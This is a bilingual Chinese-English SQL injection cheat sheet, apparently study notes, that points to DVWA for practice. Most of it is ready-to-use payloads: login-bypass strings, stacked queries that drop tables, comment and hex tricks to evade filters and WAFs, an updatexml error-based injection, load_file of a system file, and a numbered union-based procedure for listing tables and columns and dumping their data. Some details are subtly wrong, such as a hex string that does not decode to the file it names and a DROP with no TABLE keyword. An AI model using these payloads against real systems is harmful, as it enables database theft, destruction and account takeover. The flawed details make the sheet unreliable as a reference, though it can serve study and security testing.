# SQL 注入

## 注入方式
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
### Line Comments（行注释）
- 注释多余查询（Comments out rest of the query.）
```sql
-- 注释标识一， 两个短横线+一个空格
#注释标识二，井号
/* 注释标志三，C语言注释 */
-- 行注释实例： 
select * from members where username='admin'-- ' and password='password'
select * from members where username='admin'# ' and password='password'
```
### Inline Comments(行内注释)
```sql
drop/*Comment*/sampletable
dr/**/op/*bypass blacklisting*/sampletable
select/*avoid-spaces*/password/**/from/**/members

# 特殊注释查询
/*
 Mysql的特殊注释查询/*!Mysql Special SQL */
 */
select /*!32302 1/0, */ 1 from tablename -- 其中只有3.23.02及以上的版本才执行

# 查询优化器
/*+ 优化器 */

```

### Stacking Queries(多语句查询)
```sql
select * from members; drop members-- 
/*
 * PHP-MySQL doesn't support stacked queries.
 * Jave doesn't support stacked queries(I'm sure for Oracle. not quite sure about other databases).
 */
-- Stacked SQL Injection Attack Samples
-- ID: 10; drop members --
select * from products where id = 10; drop members-- 
```
### If Statements(If语法)
```sql
-- Mysql If Statement
if(condition, true-part,false-part)
select if(1=1,'true','false')

-- SQL Server If Statement
-- if condition true-part else false-part
IF (1=1) select 'true' else select 'false'

-- Oracle If Statecoment
-- Begin if condition then true-part; else false-part; end if end
if (1=1) then dbms_lock.sleep(3); else dbms_lock.sleep(0); end if end

-- PostgreSQL If Statement
-- select case when condition then true-part else false-part end;
select case when (1=1) then 'A' else 'B' end;

--If Statement SQL Injection Attack Samples
if ((select user) = 'sa') or (select user) = 'dbo') select 1 else select 1/0
```

### Using Integers
```sql
/*
 * Very useful for bypassing,magic_quotes() and similar filters. or even WAFs
 * 0xHEXNUMBER(SM)
 * You can write hex like theese:
 * select char(0x66)(S)
 * select 0x5045(This is not an intger it will be a string from Hex)(M)
 * select 0x50 + 0x45(This is ingteger now!)(M)
 */
```

### String Operations(字符串运算)
```sql
/*
 * + (S)
 * select login + '-' + password from members
 * || (*MO)
 * select login || '-' || password from members
 * About MySQL "||"
 * If MySQL is running in ANSI mode it's going to work but otherwise MySQL accept is as 'logical operator' it'll return 0. A better way to do it is using CONCAT() function in MySQL.
 * concat(str1, str2, str3, str4, ...)(M)
 */
 
-- Strings without Quotes
-- 0x457578
select 0x457578 -- (M)
select concat('o0x', HEX('c:\\boot.ini')) -- (M)
select concat(char(75), char(76), char(77)) -- (M)
select char(75)+char(76)+char(77) -- (S)
select char(75)||char(76)||char(77) -- (O)
select (char(75)||char(76)||char(77))-- (P)

-- Hex based SQL Injection Samples
select load_file(0x633A5C626F6F742E696369) -- (M)

-- String Modification & Related
# ASCII() -- (SMP)
# char() -- (SM)

```

### Bypassing Login Screens (SMO+)
```sql
-- SQL Injection 101, Login tricks
# admin' -- 
# admin' # 
# admin' /*
# ' or 1=1-- 
# ' or 1=1#
# ' or 1=1/*
# ') or '1'='1--
# ') or ('1'='1--
# Login as different user(SM*)
#   ' union select 1, 'anotheruser','doesnt metter', 1--

-- Bypassing second MD5 hash check login screens
# admin' and 1=0 union all select 'admin','81dc9bdb52d04dc20036dbd8313ed055'

```

## 注入方法
1) 联合查询注入
2) 报错注入
?id=1' and updatexml(1,(concat('^',database(),'^')),1) --
3) 延迟注入
4) BOOL盲注
## 常用SQL注入字符
```SQL
` . ' " ) ] } / \ --
```
## Firefox 黑客工具栏
- Hackbar
## 联合查询注入
1) 看页面URL地质是否有后台传参动作
2) 构造传参值  ?id=51' 验证输入后台是否能够解析
3) and 1=1判断页面是否正常； and 1=2 判断页面是否部分报错; or 1=1 
4) order by 5 (5可以是其他数字，找到报错和不报错的临界点，取不报错的最大值)
5) union select 1,2,3,4,5,6,7 --+ 
- --+指注释掉插入攻击语句后的所有代码
- 匹配order by 验证出来的列数
- 联合查询时，前面Id的值要用负数（-5）
6) union select 1,2,3,4,5,6,构造语句,7
- database()  当前使用的数据库名称
- user()      当前登陆数据库的用户
- @@version   当前数据库版本
- @@basedir   查看路径
7) 爆库   查看当前数据库中有哪些表
```SQL
(select group_concat(table_name) from information_schema.tables where table_schema=0xxxx)
-- table_schema 的值需要输入16进制
```
8) 爆表   找到疑似关键信息的表
9) 查询表的列
```SQL
(select group_concat(column_name) from information_schema.columns where table_schema=0xxxx and table_name=0xxxx)
-- table_schema 和 tabale_name 的值需要输入16进制
```
10) 爆数据  查询表中的数据
```SQL
(select group_concat(concat(column1, column2, '%23')) from table_name)
-- %23 是URL编码
```

## PHP攻击练习工具
![DVWA](https://github.com/digininja/DVWA)
